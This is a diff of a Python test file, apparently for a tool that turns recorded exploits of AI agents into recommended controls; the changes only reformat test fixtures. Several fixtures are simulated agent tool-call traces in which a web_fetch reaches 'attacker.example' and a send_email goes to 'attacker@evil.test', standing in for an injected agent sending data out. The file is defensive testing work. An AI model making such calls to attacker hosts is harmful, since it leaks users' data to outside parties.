@@ -230,7 +230,12 @@ def test_w3_evidence_picks_the_off_allowlist_occurrence_not_the_last():
 
 def test_w3_confidence_high_when_declared_in_control_config():
     trace = [
-        {"tool": "web_fetch", "args": {"dest": "http://attacker.example"}, "result": "ok", "is_error": False}
+        {
+            "tool": "web_fetch",
+            "args": {"dest": "http://attacker.example"},
+            "result": "ok",
+            "is_error": False,
+        }
     ]
     ex = _exploit(pattern_id="w3", weakness="W3", effect_trace=trace, tool_calls=("web_fetch",))
     target = TargetContext(
@@ -288,7 +293,12 @@ def test_w4_human_approval_is_demoted_to_residual_never_primary():
 
 def test_w4_prescription_blocks_via_config_snippet_round_trip():
     trace = [
-        {"tool": "send_email", "args": {"to": "attacker@evil.test"}, "result": "sent", "is_error": False}
+        {
+            "tool": "send_email",
+            "args": {"to": "attacker@evil.test"},
+            "result": "sent",
+            "is_error": False,
+        }
     ]
     ex = _exploit(
         pattern_id="w4",
@@ -526,7 +536,9 @@ def test_never_raises_on_malformed_trace(weakness):
     ex = ExploitRecord(
         target_id="mcp:custom",
         pattern_id="p",
-        payload=Payload(pattern_id="p", channel="user-message", body="x", metadata={"weakness": weakness}),
+        payload=Payload(
+            pattern_id="p", channel="user-message", body="x", metadata={"weakness": weakness}
+        ),
         response=AdapterResponse(
             payload_pattern_id="p",
             raw_response="x",
@@ -551,7 +563,14 @@ def test_target_none_still_produces_a_recommendation():
     ex = _exploit(
         pattern_id="w3",
         weakness="W3",
-        effect_trace=[{"tool": "web_fetch", "args": {"url": "http://x.test"}, "result": "ok", "is_error": False}],
+        effect_trace=[
+            {
+                "tool": "web_fetch",
+                "args": {"url": "http://x.test"},
+                "result": "ok",
+                "is_error": False,
+            }
+        ],
         tool_calls=("web_fetch",),
     )
     rec = recommend(ex, target=None)
@@ -563,14 +582,23 @@ def test_effect_unprobed_degrades_confidence():
     ex = ExploitRecord(
         target_id="mcp:custom",
         pattern_id="w3",
-        payload=Payload(pattern_id="w3", channel="user-message", body="x", metadata={"weakness": "W3"}),
+        payload=Payload(
+            pattern_id="w3", channel="user-message", body="x", metadata={"weakness": "W3"}
+        ),
         response=AdapterResponse(
             payload_pattern_id="w3",
             raw_response="x",
             tool_calls=["web_fetch"],
             metadata={
                 "effect_trace": json.dumps(
-                    [{"tool": "web_fetch", "args": {"url": "http://attacker.example"}, "result": "ok", "is_error": False}]
+                    [
+                        {
+                            "tool": "web_fetch",
+                            "args": {"url": "http://attacker.example"},
+                            "result": "ok",
+                            "is_error": False,
+                        }
+                    ]
                 ),
                 "effect_confirmed": "unprobed",
             },
@@ -662,7 +690,14 @@ def test_recommend_never_calls_the_llm_chokepoint(monkeypatch):
     ex = _exploit(
         pattern_id="w3",
         weakness="W3",
-        effect_trace=[{"tool": "web_fetch", "args": {"url": "http://x.test"}, "result": "ok", "is_error": False}],
+        effect_trace=[
+            {
+                "tool": "web_fetch",
+                "args": {"url": "http://x.test"},
+                "result": "ok",
+                "is_error": False,
+            }
+        ],
         tool_calls=("web_fetch",),
     )
     rec = recommend(ex)
@@ -699,7 +734,9 @@ def test_every_prescription_citation_id_resolves():
     ex_w4 = _exploit(
         pattern_id="w4",
         weakness="W4",
-        effect_trace=[{"tool": "send_email", "args": {"to": "x"}, "result": "sent", "is_error": False}],
+        effect_trace=[
+            {"tool": "send_email", "args": {"to": "x"}, "result": "sent", "is_error": False}
+        ],
         tool_calls=("send_email",),
         metadata={"consequential_tool": "send_email"},
     )
@@ -722,7 +759,14 @@ def test_render_markdown_is_deterministic():
     ex = _exploit(
         pattern_id="w3",
         weakness="W3",
-        effect_trace=[{"tool": "web_fetch", "args": {"url": "http://x.test"}, "result": "ok", "is_error": False}],
+        effect_trace=[
+            {
+                "tool": "web_fetch",
+                "args": {"url": "http://x.test"},
+                "result": "ok",
+                "is_error": False,
+            }
+        ],
         tool_calls=("web_fetch",),
     )
     rec = recommend(ex)
@@ -734,7 +778,9 @@ def test_to_dict_is_json_serializable():
     ex = _exploit(
         pattern_id="w4",
         weakness="W4",
-        effect_trace=[{"tool": "send_email", "args": {"to": "x"}, "result": "sent", "is_error": False}],
+        effect_trace=[
+            {"tool": "send_email", "args": {"to": "x"}, "result": "sent", "is_error": False}
+        ],
         tool_calls=("send_email",),
         metadata={"consequential_tool": "send_email"},
     )
@@ -787,7 +833,12 @@ def test_w3_code_sketch_uses_typescript_for_a_node_target():
         pattern_id="w3",
         weakness="W3",
         effect_trace=[
-            {"tool": "web_fetch", "args": {"url": "http://attacker.example"}, "result": "ok", "is_error": False}
+            {
+                "tool": "web_fetch",
+                "args": {"url": "http://attacker.example"},
+                "result": "ok",
+                "is_error": False,
+            }
         ],
         tool_calls=("web_fetch",),
     )
@@ -803,7 +854,9 @@ def test_w4_code_sketch_defaults_to_python_for_an_unset_target():
     ex = _exploit(
         pattern_id="w4",
         weakness="W4",
-        effect_trace=[{"tool": "send_email", "args": {"to": "x"}, "result": "sent", "is_error": False}],
+        effect_trace=[
+            {"tool": "send_email", "args": {"to": "x"}, "result": "sent", "is_error": False}
+        ],
         tool_calls=("send_email",),
         metadata={"consequential_tool": "send_email"},
     )
@@ -820,7 +873,12 @@ def test_code_sketch_names_the_declared_framework_without_inventing_its_api():
         pattern_id="w3",
         weakness="W3",
         effect_trace=[
-            {"tool": "web_fetch", "args": {"url": "http://attacker.example"}, "result": "ok", "is_error": False}
+            {
+                "tool": "web_fetch",
+                "args": {"url": "http://attacker.example"},
+                "result": "ok",
+                "is_error": False,
+            }
         ],
         tool_calls=("web_fetch",),
     )
@@ -839,7 +897,9 @@ def test_code_sketch_no_framework_declared_has_no_note():
     ex = _exploit(
         pattern_id="w4",
         weakness="W4",
-        effect_trace=[{"tool": "send_email", "args": {"to": "x"}, "result": "sent", "is_error": False}],
+        effect_trace=[
+            {"tool": "send_email", "args": {"to": "x"}, "result": "sent", "is_error": False}
+        ],
         tool_calls=("send_email",),
         metadata={"consequential_tool": "send_email"},
     )
@@ -860,7 +920,11 @@ def test_rest_transport_target_gets_rest_prescriptions_not_w1_w4():
     rec = recommend(ex, target=target)
     assert rec.weakness_class == "rest"
     control_ids = {p.control_id for p in rec.prescriptions}
-    assert control_ids == {"rest-input-framing", "rest-on-behalf-of-identity", "rest-endpoint-allowlist"}
+    assert control_ids == {
+        "rest-input-framing",
+        "rest-on-behalf-of-identity",
+        "rest-endpoint-allowlist",
+    }
 
 
 def test_rest_recommendation_fires_from_stamped_weakness_even_without_a_target():
@@ -895,7 +959,9 @@ def test_rest_recommendation_never_raises_with_malformed_trace():
     ex = ExploitRecord(
         target_id="mcp:custom",
         pattern_id="p",
-        payload=Payload(pattern_id="p", channel="user-message", body="x", metadata={"weakness": "input-frame"}),
+        payload=Payload(
+            pattern_id="p", channel="user-message", body="x", metadata={"weakness": "input-frame"}
+        ),
         response=AdapterResponse(
             payload_pattern_id="p",
             raw_response="x",
